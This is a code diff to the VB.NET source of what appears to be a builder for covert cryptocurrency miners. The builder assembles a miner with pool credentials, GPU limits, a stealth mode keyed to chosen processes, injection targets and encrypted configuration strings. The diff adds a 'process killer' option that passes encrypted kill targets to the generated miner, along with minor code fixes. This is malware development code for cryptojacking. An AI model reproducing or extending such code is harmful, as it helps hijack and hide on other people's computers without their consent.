@@ -35,7 +35,7 @@ Public Class Form1
     Public SALT As String = Randomi(32)
     Public IV As String = Randomi(16)
 
-    Public Key = RandomString(32)
+    Public Key As String = RandomString(32)
 
     Public InjectionTarget As String()
 
@@ -71,7 +71,7 @@ Public Class Form1
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
             Dim minerbuilder As New StringBuilder(My.Resources.Program)
-            Dim argstr As String = " --cinit-find-e --pool=" & txtPoolScheme.Text.Split(" "c)(0) & "://" & "`" & txtPoolUsername.Text & "`" & If(String.IsNullOrEmpty(txtPoolWorker.Text), "", "." & txtPoolWorker.Text) & If(String.IsNullOrEmpty(txtPoolPassowrd.Text), "", ":" & txtPoolPassowrd.Text) & If(String.IsNullOrEmpty(txtPoolUsername.Text), "", "@") & txtPoolURL.Text & If(String.IsNullOrEmpty(txtPoolData.Text), "", "/" & txtPoolData.Text) & " --cinit-max-gpu=" & txtMaxGPU.Text.Replace("%", "") & " " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & If(toggleEnableStealth.Checked, " --cinit-stealth-targets=""" & Unamlib_Encrypt(FA.txtStealthTargets.Text) & """", "")
+            Dim argstr As String = " --cinit-find-e --pool=" & txtPoolScheme.Text.Split(" "c)(0) & "://" & "`" & txtPoolUsername.Text & "`" & If(String.IsNullOrEmpty(txtPoolWorker.Text), "", "." & txtPoolWorker.Text) & If(String.IsNullOrEmpty(txtPoolPassowrd.Text), "", ":" & txtPoolPassowrd.Text) & If(String.IsNullOrEmpty(txtPoolUsername.Text), "", "@") & txtPoolURL.Text & If(String.IsNullOrEmpty(txtPoolData.Text), "", "/" & txtPoolData.Text) & " --cinit-max-gpu=" & txtMaxGPU.Text.Replace("%", "") & " " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & If(toggleEnableStealth.Checked, " --cinit-stealth-targets=""" & Unamlib_Encrypt(FA.txtStealthTargets.Text) & """", "") & If(FA.toggleProcessKiller.Checked, " --cinit-kill-targets=""" & Unamlib_Encrypt(FA.txtKillTargers.Text) & """", "") & " "
 
             minerbuilder.Replace("#dll", Resources_dll)
             minerbuilder.Replace("#eth", Resources_eth)
@@ -84,6 +84,10 @@ Public Class Form1
 
             If toggleEnableStealth.Checked Then
                 argstr += " --cinit-stealth "
+            End If
+
+            If FA.toggleProcessKiller.Checked Then
+                argstr += " --cinit-kill "
             End If
 
             If toggleEnableETC.Checked Then
@@ -237,7 +241,7 @@ Public Class Form1
     End Function
 
     Public Function EncryptString(ByVal input As String)
-        Return Convert.ToBase64String(AES_Encryptor(Encoding.ASCII.GetBytes(input)))
+        Return Convert.ToBase64String(AES_Encryptor(Encoding.UTF8.GetBytes(input)))
     End Function
 
     Public Function Randomi(ByVal length As Integer) As String
@@ -296,7 +300,7 @@ Public Class Form1
 
         While i < length
             buffer(i) = chars(rand.Next(0, clength))
-            Threading.Interlocked.Increment(i)
+            i += 1
         End While
 
         Return New String(buffer)
